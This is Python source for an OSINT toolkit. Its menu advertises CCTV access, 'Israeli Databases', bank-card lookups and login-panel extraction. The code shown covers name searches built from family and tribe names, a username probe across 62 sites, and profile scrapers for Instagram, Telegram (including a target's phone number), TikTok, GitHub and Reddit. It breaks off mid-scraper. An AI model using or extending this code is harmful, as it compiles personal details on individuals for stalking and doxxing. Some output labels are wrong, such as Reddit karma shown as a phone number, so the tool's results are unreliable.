try:
    import os, requests, instaloader, urllib.parse, json, time, sys, praw, socket, ipaddress, platform, psutil, subprocess, shutil, PIL.Image, PIL.ExifTags, cv2, pycountry, concurrent.futures, hashlib, faker, random, numpy
    from instaloader import Instaloader
    from rich.console import Console; from rich.table import Table
    from telethon.sync import TelegramClient
    from datetime import datetime
    from selenium.webdriver.chrome.options import Options; from selenium.webdriver.common.by import By; from selenium import webdriver
    from psnawp_api import PSNAWP
    from binascii import hexlify
    from PIL import Image; from PIL.ExifTags import TAGS, GPSTAGS
    import phonenumbers; from phonenumbers import geocoder, carrier, timezone
    from TrackCobra import Valid
    from googlesearch import search    
    from search_engines import Google, Bing, Brave
    from bs4 import BeautifulSoup
    from http.cookiejar import CookieJar
    from tabulate import tabulate
    from io import BytesIO
except ModuleNotFoundError:
    os.system("pip install requests praw ipaddress psutil pillow opencv-python selenium rich phonenumbers bs4 telethon TrackCobra googlesearch-python tabulate")
   
    os.system("clear")

Black = "\033[1;30m"
Red = "\033[1;31m"
Green = "\033[1;32m"
Yellow = "\033[1;33m"
Blue = "\033[1;34m"
Purple = "\033[1;35m"
Cyan = "\033[1;36m"
White = "\033[1;37m"
Gray = "\033[1;39m"
DarkRed = "\033[2;31m"
DarkBlue = "\033[2;34m"
DarkPink = "\033[2;35m"
DarkCyan = "\033[2;36m"

print(f"""{Blue}
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠀⠀⠀⢢⠀⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⢣⡀⠀⠀⠀⢣⢀⠀⠘⡆⢸⡀⠀⢢⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⠑⣄⠀⢻⠀⠀⠀⠘⡌⡆⠀⡇⢸⡇⠀⢸⡀⡆⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⠼⣷⠼⡦⣼⣯⣧⣀⢰⡇⡇⢰⠇⣼⢳⠀⢸⡇⡇⠀⢸⡇⠀⡄⠀⢰⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠿⠛⢉⡈⢧⡀⣸⡆⣇⣿⠃⣿⢀⣿⣻⢷⣿⣴⣇⡿⢀⣾⢠⡇⢀⣿⠀⢰⠃⠀⡜⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡿⠋⢡⡀⠙⣦⠹⣎⣧⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣾⣿⣿⣳⣿⣧⡿⣠⣾⡿⢀⢎⠀⡼⢁⠂⠀⡐⠀⠀
                        ⠀⠀⠀⠀⠀⠀⢀⣴⠟⠉⠀⠀⢠⠹⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣵⡷⣫⣾⠞⣡⠏⣠⡞⠀⣠⡆
                        ⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠠⣱⣄⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣷⣾⣯⣶⣿⡿⠃
                        ⠀⠀⠀⠀⣴⠟⠁⠀⢤⡱⣄⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀
                        ⠀⠀⠀⣼⠋⠀⠀⣝⢦⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣷⣂⡙⣿⣿⡇⠀⠀⠀⠀⠀⠈⢉⣿⣿⣿⣿⣿⣿⠿⢿⣄⠀⠀⠀⠀⠀
                        ⠀⠀⣼⠃⠀⠀⠤⣬⣿⣿⣿⣿⣿⡉⣿⣿⣄⣼⣿⣿⣿⣿⡟⠉⠀⢿⣿⡿⠀⠀⠀⠀⠀⢠⣾⣿⠿⠿⠿⠿⣟⡳⠄⠉⠀⠀⠀⠀⠀
                        ⠀⣸⠃⠀⠀⢀⣾⣿⣿⠟⠋⢿⣥⡬⠙⣿⣿⣿⣿⣿⣿⡧⠀⠀⢲⣄⣿⠇⠀⠀⠀⢀⣴⣿⣿⣿⡿⣛⣓⠲⢤⡉⠀⠀⠀⠀⠀⠀⠀
                        ⢰⠃⠀⠀⣠⣿⣿⠟⠁⠀⠀⠘⢿⣔⣢⡴⠛⠙⠛⠛⢁⠀⢠⣾⣦⣿⠏⠀⠀⢀⣴⣿⣿⣿⣯⡭⢍⡒⢌⠙⠦⡈⢢⡀⠀⠀⠀⠀⠀
                        ⠁⠀⠀⣰⣿⡿⠁⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣄⣴⣷⣾⣷⣤⣿⠟⠁⠀⣠⣴⣿⣿⣿⣿⣾⣍⡻⡄⠈⠳⡅⠀⠈⠂⠀⠀⠀⠀⠀⠀
                        ⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠉⠉⣀⣠⣶⣿⣿⣿⣿⣿⡿⢿⣿⣮⠙⢦⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⣸⠟⠁⠀⢀⣠⣤⣶⡶⢶⣶⣶⣦⣤⣤⣤⣤⣤⣶⣶⣾⣿⣿⣿⡿⢿⡿⣝⢫⡻⣍⠳⣝⢻⢧⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⣰⠋⢀⣴⠞⠋⠉⠠⠋⠠⢋⠞⣹⢻⠏⢸⠉⡏⡿⢹⢿⢻⣿⢿⣿⡿⣦⠹⡈⠳⡘⡈⢣⠘⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠈⠀⠃⠀⠀⠘⠀⠀⡇⡜⠈⡸⢸⠀⢹⢸⠈⢆⠁⠀⢱⠁⠀⢇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠘⠀⠘⠀⠀⢸⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                
                                            {Green}v5.1.6{White}

THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
PERSONAL WEBSITE : {Blue}https://tlersa.github.io/tleralshahrani/Index.html""")
print(f"{White}- "*50)

def main_menu():
    print(f"""{White}[{Blue}01{White}] - Dorks                    [{Blue}11{White}] - Ports Scan                  [{Blue}21{White}] - Scan Links For Malwares                  
[{Blue}02{White}] - Search For Username      [{Blue}12{White}] - Deep & Dark Web             [{Blue}22{White}] - Create Fake Personal Info
[{Blue}03{White}] - Usernames OSINT          [{Blue}13{White}] - CCTV                        [{Blue}23{White}] - Create Hashtags
[{Blue}04{White}] - Domains OSINT            [{Blue}14{White}] - WebScraping                 [{Blue}24{White}] - Extract Login Panels
[{Blue}05{White}] - IP's OSINT               [{Blue}15{White}] - Get Http Cookies            [{Blue}25{White}] - Cars OSINT
[{Blue}06{White}] - Networks OSINT           [{Blue}16{White}] - Israeli Databases \U0001F923
[{Blue}07{White}] - MetaData                 [{Blue}17{White}] - Check Passwords Leakage
[{Blue}08{White}] - PhoneNumbers OSINT       [{Blue}18{White}] - Scan Websites For Bugs
[{Blue}09{White}] - Emails OSINT             [{Blue}19{White}] - Get MacAddress
[{Blue}10{White}] - Search Engine            [{Blue}20{White}] - Bank Cards OSINT

[{Blue}97{White}] - Update
[{Blue}98{White}] - Report A Bug
[{Blue}99{White}] - Help
[{Blue}00{White}] - Exit""")

def submenu1():
    print(f"""{White}[{Blue}01{White}] - Instagram
[{Blue}02{White}] - Telegram Accs
[{Blue}03{White}] - TikTok
[{Blue}04{White}] - Github
[{Blue}05{White}] - Reddit
[{Blue}06{White}] - Tellonym
[{Blue}07{White}] - Sony

[{Blue}99{White}] - Back""")

def submenu2():
    print(f"""{White}[{Blue}01{White}] - PhoneNumbers OSINT
[{Blue}02{White}] - Search For The Owner Of The PhoneNumber By Name

[{Blue}99{White}] - Back""")

def submenu3():
    print(f"""{White}[{Blue}01{White}] - Networks OSINT
[{Blue}02{White}] - Show Network Operations
[{Blue}03{White}] - Extract The Location

[{Blue}99{White}] - Back""")

def submenu4():
    print(f"""{White}[{Blue}01{White}] - Cameras Around The World
[{Blue}02{White}] - Cameras Of Places

[{Blue}99{White}] - Back""")

def submenu5():
        print(f"""{White}[{Blue}01{White}] - My acc info
[{Blue}02{White}] - Osint for user by username
[{Blue}03{White}] - Osint for user by userID

[{Blue}99{White}] - Back""")

def handle_selection(selection):
    def another_operation(): 
        ao = input(f"\n{White}Would u like another operation? ({Blue}Y{White}/{Blue}N{White}) {Blue}")
        if ao == "Y" or ao == "y" or ao == "Yes" or ao == "yes" or ao == "YES": main_menu()
        elif ao == "N" or ao == "n" or ao == "No" or ao == "no" or ao == "No": exit(f"{White}")
        else: print(f"{Red}Please choose a correct option!{White}")

    if selection == "1" or selection == "01" or selection == "Dorks" or selection == "DORKS" or selection == "dorks":
        class dorks():
            def __init__(self):
                self.fristname = None
                self.FName = None
                self.GFName = None
                self.lastname = None
                self.output = ""
                self.admin()

            def set_info(self):
                fristname = input(f"{White}[{Blue}+{White}] FristName/Nickname : {Blue}")
                FName = input(f"{White}[{Blue}+{White}] Father name : {Blue}")
                GFName = input(f"{White}[{Blue}+{White}] GrandFather name : {Blue}")
                lastname = input(f"{White}[{Blue}+{White}] Last/Family/Tribe name : {Blue}")

                if fristname == "" or fristname == " ": self.fristname = False
                else: self.fristname = fristname

                if FName == "" or FName == " ": self.FName = False
                else: self.FName = FName

                if GFName == "" or GFName == " ": self.GFName = False
                else: self.GFName = GFName

                if lastname == "" or lastname == " ": self.lastname = False
                else: self.lastname = lastname

                if self.FName and self.fristname and self.GFName and self.lastname is None:
                    input(f"{Red}Please add at least fristname!{White}")
                    exit()

            def admin(self):
                self.set_info()
                print(f"\n{White}[ Searching in internet browsers... ]")
                space = " "
                time.sleep(3)

                if self.fristname:
                    sql = self.fristname + space
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)

                if self.fristname and self.FName:
                    sql = self.fristname + space + self.FName
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)

                if self.fristname and self.GFName:
                    sql = self.fristname + space + self.GFName
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)

                if self.fristname and self.lastname:
                    sql = self.fristname + space + self.lastname
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)
             
                if self.fristname and self.FName and self.lastname:
                    sql = self.fristname + space + self.FName + space + self.lastname
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)

                if self.fristname and self.GFName and self.lastname:
                    sql = self.fristname + space + self.GFName + space + self.lastname
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)                    

                if self.fristname and self.FName and self.GFName and self.lastname:
                    sql = self.fristname + space + self.FName + space + self.GFName + space + self.lastname
                    self.search_google(sql)
                    self.search_bing(sql)
                    self.search_brave(sql)

                self.save()

            def add_info(self, link, title, text, _from): self.output += f"""[-] Link : {link}
[-] Title : {title}
[-] Text : {text}
[-] From : {_from}\n\n"""

            def search_google(self, sql):
                time.sleep(0.5)
                number_of_pages = int(input(f"{White}[{Blue}+{White}] How many pages you want to search in google? {Blue}"))
                engine = Google()
                results = engine.search(sql, pages=number_of_pages)
                seen = set()
                for data in results.__dict__['_results']:
                    text = data['text']
                    if text not in seen:
                        link = data['link']
                        title = data['title']
                        self.add_info(link, title, text, "Google")
                        seen.add(text)
                print(f"{White}[{Green}✓{White}] Done Search in Google")

            def search_bing(self, sql):
                time.sleep(0.5)
                number_of_pages = int(input(f"{White}[{Blue}+{White}] How many pages you want to search in bing? {Blue}"))
                engine = Bing()
                results = engine.search(sql, pages=number_of_pages)
                seen = set()
                for data in results.__dict__['_results']:
                    text = data['text']
                    if text not in seen:
                        link = data['link']
                        title = data['title']
                        self.add_info(link, title, text, "Google")
                        seen.add(text)
                print(f"{White}[{Green}✓{White}] Done Search in Bing")

            def search_brave(self, sql):
                time.sleep(0.5)
                number_of_pages = int(input(f"{White}[{Blue}+{White}] How many pages you want to search in brave? {Blue}"))
                engine = Brave()
                results = engine.search(sql, pages=number_of_pages)
                seen = set()
                for data in results.__dict__['_results']:
                    text = data['text']
                    if text not in seen:
                        link = data['link']
                        title = data['title']
                        self.add_info(link, title, text, "Google")
                        seen.add(text)
                print(f"{White}[{Green}✓{White}] Done Search in Brave")

            def save(self):
                with open(f"Dorks results.txt", "wt", encoding="utf-8") as F: F.write(self.output)
                F.close()
                print(f"\n{White}[{Green}✓{White}] The results has been saved in {Blue}{ os.getcwd()}\Dorks results.txt{White}")
        dorks()
    elif selection == "2" or selection == "02" or selection == "Search For Username" or selection == "SEARCH FOR USERNAME" or selection == "search for username":
        try:
            def search_social_media(username):
                websites = {
                    "FaceBook": f"https://www.facebook.com/public/{username}/",
                    "Instagram": f"https://instagram.com/{username}/",
                    "YouTube": f"https://www.youtube.com/@{username}/",            
                    "TikTok": f"https://www.tiktok.com/@{username}/",
                    "SnapChat": f"https://www.snapchat.com/add/{username}/",
                    "Telegram": f"https://t.me/{username}/",
                    "Spotify": f"https://open.spotify.com/user/{username}/",            
                    "X": f"https://twitter.com/{username}/",
                    "Pinterest": f"https://in.pinterest.com/{username}/",
                    "Reddit": f"https://www.reddit.com/user/{username}/",
                    "Tumblr": f"https://tumblr.com/{username}/",
                    "Google+": f"https://plus.google.com/s/{username}/top/",
                    "Weibo": f"https://weibo.com/u/{username}/",     
                    "Badoo": f"https://www.badoo.com/en/{username}/",
                    "Behance": f"https://www.behance.net/{username}/",
                    "Dribbble": f"https://dribbble.com/{username}/",
                    "Kuaishou": f"https://www.kuaishou.com/profile/{username}/",
                    "YY": f"https://www.yy.com/u/{username}/",
                    "Quora": f"https://www.quora.com/profile/{username}/",     
                    "Tieba Baidu": f"https://tieba.baidu.com/f?kw={username}/", 
                    "Imgur": f"https://imgur.com/user/{username}/",
                    "PayPal": f"https://www.paypal.com/paypalme/{username}/",
                    "Vimeo": f"https://vimeo.com/{username}/",      
                    "Discord": f"https://discord.gg/{username}/",
                    "Likee": f"https://l.likee.video/p/{username}/",
                    "PicsArt": f"https://picsart.com/{username}/",
                    "Twitch": f"https://www.twitch.tv/{username}/",
                    "Linkedin": f"https://www.linkedin.com/in/{username}/",
                    "Threads": f"https://www.threads.net/@{username}/",
                    "Medium": f"https://medium.com/@{username}/",                    
                    "Stack Exchange": f"https://academia.stackexchange.com/users/{username}/",
                    "Wattpad": f"https://www.wattpad.com/user/{username}/",
                    "SoundCloud": f"https://soundcloud.com/{username}/",
                    "Deviantart": f"https://www.deviantart.com/{username}/",
                    "YuboLive": f"https://www.deviantart.com/{username}/",
                    "Tinder": f"https://tinder.com/app/profile/{username}/",
                    "Wordpress": f"https://wordpress.com/{username}/",
                    "NextDoor": f"https://nextdoor.com/profile/{username}/",
                    "Triller": f"https://triller.co/@{username}/",
                    "Flickr": f"https://www.flickr.com/people/{username}/",
                    "Foursquare": f"https://foursquare.com/user/{username}/",          
                    "Steam": f"https://steamcommunity.com/id/{username}/",
                    "Roblox": f"https://www.roblox.com/user.aspx?username={username}/",
                    "Fotolog": f"https://fotolog.com/{username}/",
                    "Gaiaonline": f"https://www.gaiaonline.com/profiles/{username}/",       
                    "Myspace": f"https://myspace.com/{username}/",
                    "Replit": f"https://replit.com/@{username}/",
                    "Tagged": f"https://www.tagged.com/{username}/",
                    "Mixi": f"https://mixi.jp/view_community.pl?id= {username}/",
                    "Crunchyroll": f"https://www.crunchyroll.com/{username}/",
                    "Meetup": f"https://www.meetup.com/{username}/",
                    "Tellonym": f"https://tellonym.me/{username}/",
                    "Pastebin": f"https://pastebin.com/u/{username}/",
                    "Github": f"https://github.com/{username}/",
                    "Gitlab": f"https://gitlab.com/{username}/",
                    "Wikipedia": f"https://www.wikipedia.org/wiki/User:{username}/",
                    "Udemy": f"https://www.udemy.com/user/{username}/",
                    "Canva": f"https://www.canva.com/{username}/",
                    "Payhip": f"https://payhip.com/{username}",
                    "Portswigger": f"https://portswigger.net/users//{username}",
                    "DokanTip": f"https://tip.dokan.sa/{username}/",
                    "Harmash": f"https://harmash.com/users/{username}/",
                    "EXPO ReactNative": f"https://expo.dev/accounts/{username}" }

                found_sites = []
                for site, url in websites.items():
                    response = requests.get(url)
                    if response.status_code == 200:
                        time.sleep(0.5)
                        print(f"{White}[{Green}✓{White}] {site} : Found - {Yellow}{url}")
                        found_sites.append(f"{site} : {url}")
                    else: print(f"{White}[{Red}X{White}] {site} Not Found")

                print(f"\n{White}[{Green}✓{White}] Done search in 62 social media!")

                return found_sites

            def save_results(results):
                with open(f"search_social_media_results.txt", "wt") as F:
                    for i, result in enumerate(results, start=1): F.write(f"{i}- {result}\n")
                F.close()
                print(f"{White}[{Green}✓{White}] The results has been saved in {Blue}{ os.getcwd()}\search social media results.txt{White}")

            username = input(f"{White}[{Blue}+{White}] Enter username/nickname target : {Blue}@")
            print(f"{White}Search for {Blue}@{username}{White} in")
            time.sleep(1)

            results = search_social_media(username)

            save_to_file = input(f"\n{White}Do you want to save it to a file? ({Blue}Y{White}/{Blue}N{White}) {Blue}")
            if save_to_file == "Y" or save_to_file == "y" or save_to_file == "Yes" or save_to_file == "yes" or save_to_file == "YES": save_results(results)
            elif save_to_file == "N" or save_to_file == "n" or save_to_file == "No" or save_to_file == "no" or save_to_file == "No": exit()
            else: print(f"{Red}Please choose a correct option!{White}")
        except BaseException as msg: print(f"{Red}E : {msg}")
    elif selection == "3" or selection == "03" or selection == "Usernames OSINT" or selection == "usernames OSINT" or selection == "USERNAMES OSINT" or selection == "usernames osint":
        submenu1()
        user_input = input(f"Choose : {Blue}")

        if user_input == "1" or user_input == "01" or user_input == "Instagram" or user_input == "INSTAGRAM" or user_input == "intagram" or user_input == "Insta" or user_input == "INSTA" or user_input == "insta":
            x = Instaloader()

            username = input(f"{White}[{Blue}+{White}] Enter username target : {Blue}@")

            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"{White}[ Get info for {Blue}@{username} {Green}✓{White} ]\n")
            time.sleep(1)

            f = instaloader.Profile.from_username(x.context, username)

            try:
                print(f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Info                     ┃ Acc                                                                          ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ ID                       │ {f.userid}                                                                   
│ Is business acc?         │ {"Yes" if f.is_business_account else "No"}                                   
│ Business category name   │ {f.business_category_name}                                                   
│ Is verified acc?         │ {"Yes" if f.is_verified else "No"}                                             
│ Is private acc?          │ {"Yes" if f.is_private else "No"}                                            
│ Username                 │ @{f.username}                                                                
│ Nickname                 │ {f.full_name}                                                                
│ Avater                   │ {f.profile_pic_url}                                                          
│ Followers                │ {f.followers}                                                                
│ Following                │ {f.followees}                                                                
│ Followed by viewer       │ {f.followed_by_viewer}                                                       
│ Follows by viewer        │ {f.follows_viewer}                                                           
│ Has blocked viewer       │ {f.has_blocked_viewer}                                                       
│ Posts                    │ {f.mediacount}                                                               
│ IGTV videos              │ {f.igtvcount}                                                                
│ Has public stories?      │ {f.has_public_story}                                                         
│ Has viewable stories?    │ {f.has_viewable_story}                                                       
│ Has highlight?           │ {f.has_highlight_reels}                                                      
│ Bio                      │ {f.biography}                                                                
│ Bio link                 │ {f.external_url}                                                             
│ Has requested viewer?    │ {f.has_requested_viewer}                                                     
│ Has requested by viewer? │ {f.requested_by_viewer}                                                      
└──────────────────────────┴──────────────────────────────────────────────────────────────────────────────┘""")
            except BaseException as msg: print(f"{Red}E : {msg}")
            
        elif user_input == "2" or user_input == "02" or user_input == "Telegram" or user_input == "TELEGRAM" or user_input == "telegram" or user_input == "Tele" or user_input == "TELE" or user_input == "tele":
            api_id = input(f"{White}[{Blue}+{White}] - Enter your API ID : {Blue}")
            api_hash = input(f"{White}[{Blue}+{White}] - Enter your API hash : {Blue}")

            client = TelegramClient("session_name", api_id, api_hash)

            async def main():
                await client.start()
                username = input(f"{White}[{Blue}+{White}] - Enter username/phonenumber target : {Blue}@")
                
                print(f"{White}Getting info...")
                time.sleep(3)
                print(f"{White}[ Get info for {Blue}@{username} {Green}✓{White} ]\n")
                time.sleep(1)

                try:
                    username = await client.get_entity(username)

                    table = Table(title="")
                    table.add_column("Info", no_wrap=True)
                    table.add_column("Acc")
                    table.add_row("ID", str(username.id))
                    table.add_row("Username", str("@"+username.username))
                    table.add_row("Fristname", str(username.first_name))
                    table.add_row("Lastname", str(username.last_name))
                    table.add_row("Phonenumber", str(username.phone))
                    Console().print(table, justify="left")
                except BaseException as mag: print(f"{Red}E : {mag}")

                await client.disconnect()

            if __name__ == '__main__':
                import asyncio
                asyncio.run(main())
        elif user_input == "3" or user_input == "03" or user_input == "TikTok" or user_input == "TIKTOK" or user_input == "tiktok" or user_input == "Tik" or user_input == "TIK" or user_input == "tik":
            class Tik:
                def __init__(self, username: str):
                    self.username = username
                    self.json_data = None
                    if "@" in self.username: self.username = self.username.replace("@", "")
                    self.admin()

                def admin(self):
                    self.send_request()
                    self.output()

                def send_request(self):
                    headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0"}
                    r = requests.get(f"https://www.tiktok.com/@{self.username}", headers=headers)

                    try:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        script_tag = soup.find('script', {'id': '__UNIVERSAL_DATA_FOR_REHYDRATION__'})
                        script_text = script_tag.text.strip()
                        self.json_data = json.loads(script_text)["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
                    except: print(f"{Red}E : Username not found!{White}")

                def get_user_id(self):
                    try: return str(self.json_data["user"]["id"])
                    except IndexError: return "Unknown"

                def get_name(self):
                    try: return self.json_data["user"]["nickname"]
                    except IndexError: return "Unknown"

                def is_verified(self):
                    try:
                        check = self.json_data["user"]["verified"]
                        if check == "false" or check is False: return "No"
                        else: return "Yes"
                    except: return "Unknown"

                def secUid(self):
                    try: return self.json_data["user"]["secUid"]
                    except: return "Unknown"

                def is_private(self):
                    try:
                        check = self.json_data["user"]["privateAccount"]
                        if check == "true" or check is True: return "Yes"
                        else: return "No"
                    except: return "Unknown"

                def followers(self):
                    try: return self.json_data["stats"]["followerCount"]
                    except: return "Unknown"

                def following(self):
                    try: return self.json_data["stats"]["followingCount"]
                    except: return "Unknown"

                def user_create_time(self):
                    try:
                        url_id = int(self.get_user_id())
                        binary = "{0:b}".format(url_id)
                        i = 0
                        bits = ""
                        while i < 31:
                            bits += binary[i]
                            i += 1
                        timestamp = int(bits, 2)
                        dt_object = datetime.fromtimestamp(timestamp)
                        return dt_object
                    except: return "Unknown"

                def last_change_name(self):
                    try:
                        time = self.json_data["user"]["nickNameModifyTime"]
                        check = datetime.fromtimestamp(int(time))
                        return check
                    except: return "Unknown"

                def account_region(self):
                    try: return self.json_data["user"]["region"]
                    except: return "Unknown"

                def video_count(self):
                    try: return self.json_data["stats"]["videoCount"]
                    except: return "Unknown"

                def open_favorite(self):
                    try:
                        check = self.json_data["user"]["openFavorite"]
                        if check is False or check == "false": return "No"
                        return "Yes"
                    except: return "Unknown"

                def see_following(self):
                    try:
                        check = str(self.json_data["user"]["followingVisibility"])
                        if check == "1": return "Yes"
                        return "No"
                    except: return "Unknown"

                def language(self):
                    try: return str(self.json_data["user"]["language"])
                    except: return "Unknown"

                def heart_count(self):
                    try: return str(self.json_data["stats"]["heart"])
                    except: return "Unknown"

                def output(self):
                    print(f"{White}[ Get info for {Blue}@{self.username} {Green}✓{White} ]\n")
                    time.sleep(1)

                    table = Table(title="")
                    table.add_column("Info", no_wrap=True)
                    table.add_column("Acc")
                    table.add_row("ID", str(self.get_user_id()))
                    table.add_row("SecUid", str(self.secUid()))
                    table.add_row("is verified?", str(self.is_verified()))
                    table.add_row("is private?", str(self.is_private()))
                    table.add_row("Username", str("@"+self.username))
                    table.add_row("Nickname", str(self.get_name()))
                    table.add_row("Location", str(self.account_region()))
                    table.add_row("Followers", str(self.followers()))
                    table.add_row("Following", str(self.following()))
                    table.add_row("Can see following list?", str(self.see_following()))
                    table.add_row("Videos", str(self.video_count()))
                    table.add_row("Likes", str(self.heart_count()))
                    table.add_row("Open Fav?", str(self.open_favorite()))
                    table.add_row("Language", str(self.language()))
                    table.add_row("Create", str(self.user_create_time()))
                    table.add_row("Last change nickname", str(self.last_change_name()))
                    Console().print(table, justify="left")

            username = input(f"{White}[{Blue}+{White}] Enter username target : {Blue}@")
            
            print(f"{White}Getting info...")
            time.sleep(3)
            Tik(username)
        elif user_input == "4" or user_input == "04" or user_input == "GitHub" or user_input == "GITHUB" or user_input == "github":
            class Github:
                def __init__(self):
                    self.Start()
                
                def Start(self):
                    self.username = input(f"{White}[{Blue}+{White}] Enter username target : {Blue}@")
                    
                    print(f"{White}Getting info...")
                    time.sleep(3)
                    print(f"{White}[ Get info for {Blue}@{self.username} {Green}✓{White} ]\n")
                    time.sleep(1)
                    
                    try:
                        self.Get = requests.get('https://api.github.com/users/%s'%(self.username))
                        self.Req = json.loads(self.Get.text)
                        table = Table(title="")
                        table.add_column("Info", no_wrap=True)
                        table.add_column("Acc")
                        table.add_row("ID", str(self.Req['node_id']))
                        table.add_row("Type", str(self.Req['type']))
                        table.add_row("Username", str("@"+self.Req['login']))
                        table.add_row("Acc link", str(self.Req['html_url']))
                        table.add_row("Nickname", str(self.Req['name']))
                        table.add_row("Company", str(self.Req['company']))
                        table.add_row("Bio", str(self.Req['bio']))
                        table.add_row("Public email", str(self.Req['email'] if self.Req['email'] else "No"))
                        table.add_row("Bio link", str(self.Req['blog']))
                        table.add_row("X link", str(self.Req['twitter_username'] if self.Req['twitter_username'] else "No"))
                        table.add_row("Avatar", str(self.Req['avatar_url']))
                        table.add_row("Location", str(self.Req['location']))
                        table.add_row("Followers", str(self.Req['followers']))
                        table.add_row("Following", str(self.Req['following']))
                        table.add_row("Public repos", str(self.Req['public_repos']))
                        table.add_row("Public gists", str(self.Req['public_gists']))
                        table.add_row("Create", str(self.Req['created_at']))
                        table.add_row("Hireable", str("Yes" if self.Req['hireable'] else "No"))
                        table.add_row("Last updated", str(self.Req['updated_at']))
                        Console().print(table, justify="left")
                    except BaseException as mag: print(f"{Red}E : {mag}")
            if __name__=='__main__': Github()
        elif user_input == "5" or user_input == "05" or user_input == "Reddit" or user_input == "REDDIT" or user_input == "reddit":
            client_id = input(f"{White}[{Blue}+{White}] - Enter your client ID : {Blue}")
            client_secret = input(f"{White}[{Blue}+{White}] - Enter your client secert : {Blue}")
            user_agent = input(f"{White}[{Blue}+{White}] - Enter your useragent : {Blue}@")
            username = input(f"{White}[{Blue}+{White}] - Enter username target : {Blue}@")
            
            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"{White}[ Get info for {Blue}@{username} {Green}✓{White} ]\n")   
            time.sleep(1)     

            reddit = praw.Reddit(client_id=client_id, client_secret=client_secret, user_agent=user_agent)

            try:
                username = reddit.redditor(username)

                table = Table(title="")
                table.add_column("Info", no_wrap=True)
                table.add_column("Acc")
                table.add_row("ID", str(username.id))
                table.add_row("Username", str("@"+username.name))
                table.add_row("Nickname", str(username.fullname))
                table.add_row("Avatar", str(username.icon_img))
                table.add_row("Bio", str(username.subreddit['description']))
                table.add_row("Bio link", str(username.subreddit['public_description']))
                table.add_row("Public email", str("Yes" if username.has_verified_email else "No"))
                table.add_row("Public phonenumber", str(username.comment_karma + username.link_karma))
                table.add_row("Create", str(username.created_utc))
                Console().print(table, justify="left")
            except BaseException as mag: print(f"{Red}E : {mag}")
        elif user_input == "6" or user_input == "06" or user_input == "Tellonym" or user_input == "TELLONYM" or user_input == "tellonym" or user_input == "Tell" or user_input == "TELL" or user_input == "tell":
            class Tell:
                def __init__(self, username):
                    self.username = username
                    self.driver = self.driver()
                    self.get_info()

                @staticmethod
                def driver():
                    chrome_options = Options()
                    chrome_options.add_argument('disable-infobars')
                    chrome_options.add_argument("--disable-logging")
                    chrome_options.add_argument('--log-level=3')
                    chrome_options.add_argument("--headless")
